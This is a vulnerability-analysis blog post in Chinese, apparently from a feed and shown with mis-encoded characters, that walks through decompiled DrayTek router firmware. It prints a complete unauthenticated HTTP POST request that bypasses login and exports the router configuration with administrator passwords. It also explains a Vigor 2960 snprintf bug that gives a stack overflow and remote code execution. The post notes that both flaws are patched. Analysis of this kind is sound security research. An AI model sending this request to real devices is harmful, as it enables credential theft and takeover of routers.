<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// åœ¨ [1] ä½ç½®è°ƒç”¨äº† process_post å‡½æ•°</span></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">  iVar1 = FUN_406514d8(*(undefined4 *)(param_1 + <span class="number">0x4538</span>),&amp;DAT_40f85bb0);</span><br><span class="line">  <span class="keyword">if</span> (iVar1 == <span class="number">0</span>) &#123;</span><br><span class="line">    uVar2 = FUN_40651424(<span class="string">&quot;/ACSServer/Upload&quot;</span>);</span><br><span class="line">    iVar1 = FUN_40651624(param_1 + <span class="number">0x3e2c</span>,<span class="string">&quot;/ACSServer/Upload&quot;</span>,uVar2);</span><br><span class="line">    <span class="keyword">if</span> (iVar1 == <span class="number">0</span>) &#123;</span><br><span class="line">      FUN_401a7f10(param_1);</span><br><span class="line">    &#125;</span><br><span class="line">    uVar2 = FUN_40651424(<span class="string">&quot;/SWMACSServer/Upload&quot;</span>);</span><br><span class="line">    iVar1 = FUN_40651624(param_1 + <span class="number">0x3e2c</span>,<span class="string">&quot;/SWMACSServer/Upload&quot;</span>,uVar2);</span><br><span class="line">    <span class="keyword">if</span> (iVar1 == <span class="number">0</span>) &#123;</span><br><span class="line">      process_post(param_1);    <span class="comment">// [1]</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure></div>

<p>å½“è¯·æ±‚ç±»å‹ä¸º POST æ—¶ï¼Œä¼šè°ƒç”¨ 0x4015F640 å‡½æ•°ï¼Œæˆ‘ç§°ä¹‹ä¸º <code>process_post</code>ï¼Œæ­¤å‡½æ•°è´Ÿè´£å¤„ç† POST ç±»å‹è¯·æ±‚ï¼Œå…¶ä¸­å…³é”®ä»£ç å¦‚ä¸‹</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">process_post</span><span class="params">(undefined4 *param_1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> iVar1;</span><br><span class="line">  undefined4 uVar2;</span><br><span class="line">  undefined auStack_14 [<span class="number">4</span>];</span><br><span class="line">  <span class="type">int</span> local_10;</span><br><span class="line">  <span class="type">int</span> local_c;</span><br><span class="line">  <span class="type">int</span> func_code;</span><br><span class="line">  undefined4 local_4;</span><br><span class="line">  </span><br><span class="line">  local_4 = get_curr_task_prio();</span><br><span class="line">  func_code = translate_name(param_1 + <span class="number">0xf8b</span>,param_1[<span class="number">0xf3e</span>]);    <span class="comment">// [2]</span></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (func_code &lt; <span class="number">0x1b6c</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (func_code == <span class="number">0x1b67</span>) &#123;    <span class="comment">// [3]</span></span><br><span class="line">        iVar1 = form_evaluate_access(<span class="string">&quot;/auth_check.cgi&quot;</span>,param_1 + <span class="number">5</span>);</span><br><span class="line">        <span class="keyword">if</span> ((iVar1 != <span class="number">-1</span>) &amp;&amp; (iVar1 = check_sFormAuth(param_1[<span class="number">0x114d</span>]), iVar1 != <span class="number">0</span>)) &#123;</span><br><span class="line">          iVar1 = FUN_401590c0(param_1,param_1[<span class="number">0xf3f</span>]);</span><br><span class="line">          <span class="keyword">if</span> (iVar1 == <span class="number">0</span>) &#123;</span><br><span class="line">            die(<span class="number">0x1b50</span>,<span class="string">&quot;cfg_gci_export_script&quot;</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span> &#123;</span><br><span class="line">            die(<span class="number">0x1b67</span>,<span class="number">0</span>);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>åœ¨ <code>[2]</code> å¤„ï¼Œä»£ç ä¼šè°ƒç”¨ <code>translate_name</code> å‡½æ•°æ¥å¤„ç†è¯·æ±‚ä¸­çš„ URLï¼Œè¿™ä¸ªå‡½æ•°ä¼šå°† URL å’Œå›ºå®šçš„å­—ç¬¦ä¸²è¿›è¡ŒåŒ¹é…</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ...</span></span><br><span class="line">  <span class="keyword">if</span> (*URL == <span class="string">&#x27;/&#x27;</span>) &#123;</span><br><span class="line">    uVar2 = safe_strlen(<span class="string">&quot;Draytek&quot;</span>);</span><br><span class="line">    iVar1 = safe_strncmp(URL + <span class="number">1</span>,<span class="string">&quot;Draytek&quot;</span>,uVar2);</span><br><span class="line">    <span class="keyword">if</span> ((iVar1 == <span class="number">0</span>) &amp;&amp; (iVar1 = <span class="built_in">strstr</span>(URL,<span class="string">&quot;.exp&quot;</span>), iVar1 != <span class="number">0</span>)) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0x1b67</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure></div>

<p>å½“ URL ä»¥ <code>/Draytek</code> å¼€å¤´å¹¶ä¸”åŒ…å« <code>.exp</code> å­—ç¬¦ä¸²æ—¶ï¼Œè¿”å› 0x1b67ã€‚</p>
<p>å›åˆ° <code>process_post</code> å‡½æ•°ï¼Œå½“ <code>translate_name</code> è¿”å›å€¼ä¸º 0x1b67 æ—¶ï¼Œæ¥åˆ° <code>[3]</code> å¤„ï¼Œä»£ç é¦–å…ˆè°ƒç”¨ <code>form_evaluate_access</code> æ¥æ£€æŸ¥è¯·æ±‚æ˜¯å¦åˆæ³•ã€‚</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">form_evaluate_access</span><span class="params">(__int64 fixed_url, __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  fixed_url_1 = fixed_url;</span><br><span class="line">  v15 = a2;</span><br><span class="line">  v2 = get_curr_task_prio(fixed_url, a2);</span><br><span class="line">  v23 = get_request_info(v2);</span><br><span class="line">  fixed_url_1_1 = v23 + <span class="number">23932</span>;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line"> </span><br><span class="line">  v10 = safe_strlen(<span class="string">&quot;/auth_check.cgi&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !safe_strncmp(fixed_url_1_1, <span class="string">&quot;/auth_check.cgi&quot;</span>, v10) )    <span class="comment">// [4]</span></span><br><span class="line">    check_pass = <span class="number">0</span>;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="keyword">if</span> ( check_pass &gt;= <span class="number">0</span> &amp;&amp; check_is_from_lan(v23, <span class="number">32</span> * check_pass + v2000_table) == <span class="number">-1</span> )    <span class="comment">// [5]</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  dword_4262A750 = dword_47170A24;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>åœ¨ <code>[4]</code> å¤„ï¼Œä¼šæ¯”è¾ƒç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å¦ç­‰äº <code>/auth_check.cgi</code>ï¼Œæ˜¾ç„¶æˆç«‹ï¼Œæ‰€ä»¥å˜é‡ <code>check_pass</code> ä¸º 0ã€‚</p>
<p>æ¥ç€æ¥åˆ° <code>[5]</code> å¤„ï¼Œç”±äº <code>check_pass</code> ç­‰äº 0ï¼Œä¼šç»§ç»­è°ƒç”¨ <code>check_is_from_lan</code> å‡½æ•°ã€‚</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">check_is_from_lan</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> a1, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="keyword">if</span> ( strcasestr(v2 + <span class="number">15916</span>, <span class="string">&quot;/weblogin.htm&quot;</span>)</span><br><span class="line">    || strcasestr(v2 + <span class="number">15916</span>, <span class="string">&quot;/cgi-bin/wlogin.cgi&quot;</span>)</span><br><span class="line">    || strcasestr(v2 + <span class="number">15916</span>, <span class="string">&quot;/doc/cgierr.htm&quot;</span>)</span><br><span class="line">    || strcasestr(v2 + <span class="number">15916</span>, <span class="string">&quot;/images/&quot;</span>)    <span class="comment">// [6]</span></span><br><span class="line">    || !sub_4010CD68(v2 + <span class="number">15916</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_121;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">LABEL_121:</span><br><span class="line">  <span class="keyword">if</span> ( !sub_4059A9D4(*(v2 + <span class="number">8</span>)) )</span><br><span class="line">  &#123;</span><br><span class="line">    v17 = <span class="number">16</span>;</span><br><span class="line">    getpeername(*(v2 + <span class="number">8</span>), v11 + <span class="number">168</span>, v11 + <span class="number">184</span>);</span><br><span class="line">    v26 = v16;</span><br><span class="line">    <span class="keyword">if</span> ( !sub_40140298(dword_47234F44) &amp;&amp; ((dword_4BE3E72C ^ v26) &amp; dword_4C3FF280) != <span class="number">0</span> &amp;&amp; sub_408A523C(v26, v9) &lt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v25 = sub_408A820C(v26);</span><br><span class="line">      <span class="keyword">if</span> ( (!v25 || !*(v25 + <span class="number">0x1C</span>LL) || (*(v25 + <span class="number">0x16</span>LL) &amp; <span class="number">1</span>) == <span class="number">0</span> &amp;&amp; !sub_4013FAF0(*(v25 + <span class="number">0x24</span>LL), v26))</span><br><span class="line">        &amp;&amp; ((dword_4BE3E758 &amp; <span class="number">1</span>) == <span class="number">0</span> || ((dword_4BE66B98 ^ v26) &amp; dword_4BE66B9C) != <span class="number">0</span>)</span><br><span class="line">        &amp;&amp; !IsFromLan(v26) )</span><br><span class="line">      &#123;</span><br><span class="line">        v38 = (dword_4BE3E758 &amp; <span class="number">4</span>) != <span class="number">0</span> &amp;&amp; (dword_4BE3E760 &amp; <span class="number">5</span>) != <span class="number">0</span> || (word_4BE5AA3A &amp; <span class="number">1</span>) == <span class="number">0</span> || IsFromLan(v40);</span><br><span class="line">        <span class="keyword">if</span> ( v38 &amp;&amp; !sub_4010B418(v26) &amp;&amp; !sub_4010B5FC() &amp;&amp; (word_4BE5AA3A &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">          byte_4690CAF0 = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;    <span class="comment">// [7]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>åœ¨ <code>[6]</code> å¤„åˆ¤æ–­ URL ä¸­æ˜¯å¦åŒ…å« <code>/images/</code>ï¼Œå¦‚æœæ˜¯åˆ™æ¥åˆ° <code>[7]</code> å¤„ï¼Œä»¤ <code>check_is_from_lan</code> è¿”å› 1ã€‚å›åˆ° <code>form_evaluate_access</code> å‡½æ•°ï¼Œå½“ <code>check_is_from_lan</code> è¿”å› 1 å¯ä»¥ç»§ç»­å‘ä¸‹æ‰§è¡Œï¼Œå› æ­¤ <code>form_evaluate_access</code> å‡½æ•°ä¹Ÿè¿”å› 1ï¼Œåœ¨ <code>process_post</code> å‡½æ•°ä¸­å°±é€šè¿‡äº†éªŒè¯ã€‚</p>
<p> éšåä¼šè°ƒç”¨ <code>check_sFormAuth</code> å‡½æ•°</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">bool</span> __fastcall <span class="title function_">check_sFormAuth</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// w0</span></span><br><span class="line">  __int64 v4[<span class="number">3</span>]; <span class="comment">// [xsp+0h] [xbp+0h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// [xsp+1Ch] [xbp+1Ch]</span></span><br><span class="line">  _BYTE v6[<span class="number">20</span>]; <span class="comment">// [xsp+28h] [xbp+28h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v7; <span class="comment">// [xsp+3Ch] [xbp+3Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = a1;</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  safe_memset(v6, <span class="number">0LL</span>, <span class="number">16LL</span>);</span><br><span class="line">  v7 = <span class="built_in">strstr</span>(v5, <span class="string">&quot;sFormAuthStr=&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v7 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  v1 = safe_strlen(<span class="string">&quot;sFormAuthStr=&quot;</span>);</span><br><span class="line">  v7 += v1;</span><br><span class="line">  <span class="built_in">strncpy</span>(v4 + <span class="number">40</span>, v7, <span class="number">15LL</span>);    <span class="comment">// [8]</span></span><br><span class="line">  v6[<span class="number">15</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> cmp_authstr(v4 + <span class="number">40</span>) != <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> __fastcall <span class="title function_">cmp_authstr</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> safe_strcmp(<span class="number">644</span> * dword_4264B86C + <span class="number">608</span> + &amp;unk_4FC06530 + <span class="number">8</span>, a1) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>è¿™ä¸ªå‡½æ•°ä¼šå°è¯•è·å–è¯·æ±‚ä¸­çš„ sFormAuthStr GET å‚æ•°ï¼Œå¹¶è°ƒç”¨ <code>cmp_authstr</code> ä¸å†…å­˜ä¸­ä¿å­˜çš„æ•°æ®æ¯”è¾ƒã€‚</p>
<p>è¿™é‡Œçš„é—®é¢˜æ˜¯ï¼Œæ— ç”¨æˆ·ç™»å½•çš„æƒ…å†µä¸‹ï¼Œå†…å­˜ä¸­ç”¨äºä¿å­˜ sFormAuthStr çš„åœ°å€å†…å®¹ä¸ºç©º(0x00)ï¼Œå½“æˆ‘ä»¬åªä¼ å…¥ GET å‚æ•°å <code>sFormAuthStr=</code>ï¼Œè€Œä¸è·Ÿéšå‚æ•°å€¼æ—¶ï¼Œåœ¨ <code>[8]</code> å¤„çš„ strncpy æ‹·è´çš„ä¹Ÿæ˜¯ç©ºå€¼(0x00)ã€‚æ­¤æ—¶ strcmp ä¸¤ä¸ªå‚æ•°å†…å®¹å‡ä¸ºç©ºï¼Œæ‰€ä»¥æ¯”è¾ƒæˆç«‹ï¼Œå¯¼è‡´ <code>check_sFormAuth</code> è¿”å›éªŒè¯æˆåŠŸã€‚</p>
<p>è‡³æ­¤æ¥å£çš„ä¸¤ä¸ªéªŒè¯å‡½æ•°éƒ½è¢«ç»•è¿‡ï¼Œå¯ä»¥ç›´æ¥è®¿é—®æœ€ç»ˆçš„åŠŸèƒ½å‡½æ•°ã€‚å›åˆ° <code>process_post</code>ï¼Œä¼šç»§ç»­æ‰§è¡Œ <code>die(0x1b50,&quot;cfg_gci_export_script&quot;);</code>ï¼Œdie æ˜¯ä¸€ä¸ªå¾ˆå¤§çš„å‡½æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯åŠŸèƒ½å¯¹åº”çš„ opcodeï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯åŠŸèƒ½åç§°ï¼Œå¯ä»¥çœ‹åˆ° 0x1b50 å¯¹åº”é…ç½®æ–‡ä»¶å¯¼å‡ºã€‚</p>
<p>å› æ­¤æ„é€ å¦‚ä¸‹è¯·æ±‚èƒ½å¤Ÿè·å–è®¾å¤‡çš„é…ç½®æ–‡ä»¶ï¼Œé…ç½®æ–‡ä»¶ä¸­åŒ…å«ç³»ç»Ÿç®¡ç†å‘˜å¯†ç ç­‰æ•æ„Ÿä¿¡æ¯ã€‚</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /Draytek.exp/images/?sFormAuthStr= HTTP/1.1</span><br><span class="line">Host: x.x.x.x</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 63</span><br><span class="line"></span><br><span class="line">chk_encryptcfg=170&amp;sEncryptPwd=&amp;sEncryptCnfrmPwd=&amp;sFormAuthStr=</span><br></pre></td></tr></table></figure></div>

<p>ä»¥ç®¡ç†å‘˜èº«ä»½ç™»å½•åæ”»å‡»è€…å¯ä»¥å°è¯•å¯»æ‰¾ä¸€äº›åå°æ¼æ´åˆ©ç”¨ï¼Œå¹¶é€ƒé€¸åˆ°åº•å±‚çš„ Linux ç³»ç»Ÿï¼Œå®ç°æŒä¹…åŒ–æ§åˆ¶ã€‚</p>
<p>ç›®å‰å®˜æ–¹å·²ç»ä¿®å¤è¯¥æ¼æ´ï¼Œå»ºè®®ä½¿ç”¨è¯¥è®¾å¤‡çš„ç”¨æˆ·åŠæ—¶æ›´æ–°ã€‚</p>
<h2 id="Vigor-2960-é™é»˜ä¿®å¤æ¼æ´"><a href="#Vigor-2960-é™é»˜ä¿®å¤æ¼æ´" class="headerlink" title="Vigor 2960 é™é»˜ä¿®å¤æ¼æ´"></a>Vigor 2960 é™é»˜ä¿®å¤æ¼æ´</h2><p>ä¸ Draytek å…¶å®ƒå‹å·ä¸åŒï¼ŒVigor 2960 ç³»åˆ—è®¾å¤‡é‡‡ç”¨äº† Linux ä½œä¸ºåº•å±‚ç³»ç»Ÿï¼Œå¹¶æ²¡æœ‰ä½¿ç”¨è‡ªç ”çš„ DrayOSã€‚</p>
<p>æœ‰å…³äº 2960 å‡ºç°è¿‡çš„å†å²æ¼æ´ï¼Œç½‘ç»œä¸Šæœ‰å¾ˆå¤šå¤ç°æ–‡ç« ï¼Œæ„Ÿå…´è¶£çš„æœ‹å‹å¯ä»¥è‡ªè¡ŒæŸ¥æ‰¾ã€‚éœ€è¦æ³¨æ„çš„æ˜¯è¯¥æ¬¾è®¾å¤‡å·²ç»å¤„äº <a class="link"   href="https://www.draytek.com/support/product-lifecycle/" >EOS<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> çŠ¶æ€ï¼Œå®˜æ–¹æ”¯æŒå°†æŒç»­åˆ° 2026 å¹´ 12 æœˆï¼Œå»ºè®®ä½¿ç”¨è¯¥è®¾å¤‡çš„ç”¨æˆ·åŠæ—¶æ›´æ¢æ–°çš„äº§å“ã€‚</p>
<p>åœ¨ 2024 å¹´ 3 æœˆï¼Œå®˜æ–¹å‘å¸ƒäº† 1.5.1.6 ç‰ˆæœ¬æ›´æ–°ï¼Œè¯¥ç‰ˆæœ¬ä¸­åŒ…å«å¯¹ä¸€ä¸ªæœªæˆæƒè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´çš„ä¿®å¤ã€‚</p>
<p>web æœåŠ¡çš„å…³é”®ç¨‹åºæ˜¯ mainfunction.cgiï¼Œè¿™é‡Œåˆ—ä¸¾ 1.5.1.5 å’Œ 1.5.1.6 ä¸¤ä¸ªç‰ˆæœ¬ä»£ç å¦‚ä¸‹</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1.5.1.5</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [sp+100h] [bp-40h] BYREF</span></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v5, <span class="string">&quot;/cvmcfgupload&quot;</span>) || !<span class="built_in">strcmp</span>(v5, <span class="string">&quot;/apmcfgupload&quot;</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  v21 = getenv(<span class="string">&quot;QUERY_STRING&quot;</span>);</span><br><span class="line">  v22 = <span class="built_in">strcmp</span>(v5, <span class="string">&quot;/apmcfgupload&quot;</span>) == <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v21 &amp;&amp; (<span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x20</span>u), v23 = time(<span class="number">0</span>), (v24 = <span class="built_in">strstr</span>(v21, <span class="string">&quot;session=&quot;</span>)) != <span class="number">0</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">snprintf</span>(s, <span class="string">&quot;%s&quot;</span>, v24 + <span class="number">8</span>, <span class="number">11</span>);    <span class="comment">// [1]</span></span><br><span class="line">    v25 = strtoul(s, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line">    v26 = v23 - (v25 ^ (v25 &lt;&lt; <span class="number">16</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1.5.1.6</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> s[<span class="number">52</span>]; <span class="comment">// [sp+104h] [bp-34h] BYREF</span></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v5, <span class="string">&quot;/cvmcfgupload&quot;</span>) || !<span class="built_in">strcmp</span>(v5, <span class="string">&quot;/apmcfgupload&quot;</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  v20 = getenv(<span class="string">&quot;QUERY_STRING&quot;</span>);</span><br><span class="line">  v33 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v5, <span class="string">&quot;/apmcfgupload&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(v34, <span class="number">0</span>, <span class="keyword">sizeof</span>(v34));</span><br><span class="line">    <span class="built_in">snprintf</span>(&amp;v33, <span class="number">0x100</span>u, <span class="string">&quot;uci get apmd.general.status&quot;</span>);</span><br><span class="line">    v21 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(v34, <span class="number">0</span>, <span class="keyword">sizeof</span>(v34));</span><br><span class="line">    <span class="built_in">snprintf</span>(&amp;v33, <span class="number">0x100</span>u, <span class="string">&quot;uci get cvmd.general.status&quot;</span>);</span><br><span class="line">    v21 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v22 = sub_21F28(&amp;v33);</span><br><span class="line">  <span class="built_in">snprintf</span>(&amp;v33, <span class="number">0x100</span>u, <span class="string">&quot;uci get acc_ctrl.access_control.user_define&quot;</span>);</span><br><span class="line">  v23 = sub_21F28(&amp;v33);</span><br><span class="line">  <span class="keyword">if</span> ( v22 )</span><br><span class="line">  &#123;</span><br><span class="line">    v24 = <span class="built_in">strcmp</span>(v22, <span class="string">&quot;enable&quot;</span>) == <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !v23 )</span><br><span class="line">      v24 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v24 &amp;&amp; !<span class="built_in">strcmp</span>(v23, <span class="string">&quot;enable&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v20 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0xC</span>u);</span><br><span class="line">        v25 = time(<span class="number">0</span>);</span><br><span class="line">        v26 = <span class="built_in">strstr</span>(v20, <span class="string">&quot;session=&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v26 )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">snprintf</span>(s, <span class="number">0xB</span>u, <span class="string">&quot;%s&quot;</span>, v26 + <span class="number">8</span>);    <span class="comment">// [2]</span></span><br><span class="line">          v27 = strtoul(s, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line">          <span class="keyword">if</span> ( v25 - (v27 ^ (v27 &lt;&lt; <span class="number">16</span>)) &lt;= <span class="number">0x64</span> )</span><br><span class="line">            sub_11660(a3, v20, v21);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(v22);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v23 )</span><br><span class="line">    <span class="built_in">free</span>(v23);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure></div>

<p>å¯ä»¥çœ‹åˆ°è¿™æ˜¯ä¸€ä¸ªéå¸¸ç®€å•çš„æ¼æ´ï¼Œå½“ç”¨æˆ·è¯·æ±‚ <code>/cvmcfgupload</code> æˆ–è€… <code>/apmcfgupload</code> æ—¶ï¼Œä»£ç å°è¯•åœ¨ GET å‚æ•°ä¸­æ‰¾åˆ° sessionï¼Œå¦‚æœå­˜åœ¨çš„è¯ï¼Œåœ¨ <code>[1]</code> å¤„ä½¿ç”¨ snprintf å°†å…¶æ‹·è´åˆ°æ ˆç¼“å†²åŒºã€‚</p>
<p>ç„¶è€Œ snprintf çš„å‡½æ•°å®šä¹‰ä¸º</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">snprintf</span><span class="params">(<span class="type">char</span> *str, <span class="type">size_t</span> size, <span class="type">const</span> <span class="type">char</span> *format, ...)</span>;</span><br></pre></td></tr></table></figure></div>

<p>å…¶ä¸­ç¬¬äºŒä¸ªå‚æ•°åº”è¯¥æ˜¯æœ€å¤§é•¿åº¦ï¼Œä½†å¼€å‘è€…é”™è¯¯çš„å°†å…¶è®¾ç½®ä¸ºæ ¼å¼åŒ–å­—ç¬¦ä¸² <code>%s</code>ï¼Œè¿™å¯¼è‡´ä¸¤ä¸ªé—®é¢˜ï¼Œæ ˆæº¢å‡ºå’Œ Format string æ¼æ´ã€‚</p>
<p><code>cvmcfgupload</code> å’Œ <code>apmcfgupload</code> ä¸¤ä¸ªæ¥å£ä¸éœ€è¦æƒé™å³å¯è®¿é—®ï¼Œä¸” cgi ç¨‹åºæ²¡æœ‰å¼€å¯ Canaryã€NX ç­‰ä¿æŠ¤æªæ–½ï¼Œæ ˆæº¢å‡ºæ§åˆ¶è¿”å›åœ°å€ä¹‹åå¯ä»¥ç›´æ¥è·³è½¬åˆ° stack æ¥æ‰§è¡Œ shellcodeï¼Œå…è®¸æ”»å‡»è€…æœªæˆæƒåœ¨è®¾å¤‡ä¸Šæ‰§è¡Œä»»æ„ä»£ç ã€‚æ–°ç‰ˆæœ¬åœ¨ <code>[2]</code> å¤„è°ƒæ¢äº†å‚æ•°ä½ç½®ï¼Œå®Œæˆå¯¹æ¼æ´çš„ä¿®å¤ã€‚</p>
<p>ç›®å‰å®˜æ–¹å·²ç»ä¿®å¤è¯¥æ¼æ´ï¼Œå»ºè®®ä½¿ç”¨è¯¥è®¾å¤‡çš„ç”¨æˆ·åŠæ—¶æ›´æ–°ã€‚</p>
<h2 id="å†™åœ¨æœ€å"><a href="#å†™åœ¨æœ€å" class="headerlink" title="å†™åœ¨æœ€å"></a>å†™åœ¨æœ€å</h2><p>æ­¤ç±»å‚æ•°ä½ç½®é”™è¯¯ï¼Œä»¥åŠå¯¹äºä¸å®‰å…¨å‡½æ•°çš„ä½¿ç”¨åœ¨æºç æ£€æŸ¥æˆ–ç¼–è¯‘é˜¶æ®µå°±åº”è¯¥è¢«å‘ç°å¹¶çº æ­£ï¼Œå¸Œæœ›å¼€å‘è€…å¯ä»¥é‡è§†è½¯ä»¶å®‰å…¨ï¼Œé˜²æ­¢æ¶æ„æ”»å‡»é€ æˆç”¨æˆ·éšç§ä¿¡æ¯æ³„éœ²å’Œè´¢äº§æŸå¤±ã€‚</p>
]]></content>
      <categories>
        <category>æ¼æ´åˆ†æ</category>
      </categories>
  </entry>
  <entry>
    <title>æ­å»º FortiGate è°ƒè¯•ç¯å¢ƒ (äºŒ)</title>
    <url>/2024/04/02/fortigate_debug_env2/</url>
    <content><![CDATA[<p>å…³äºå¦‚ä½•è·å– FortiGate shell æƒé™ï¼Œå¯ä¿¡æ‰§è¡Œå’Œæ–°ç‰ˆæœ¬ License æˆæƒåˆ†æã€‚(äºŒ)</p>
<span id="more"></span>

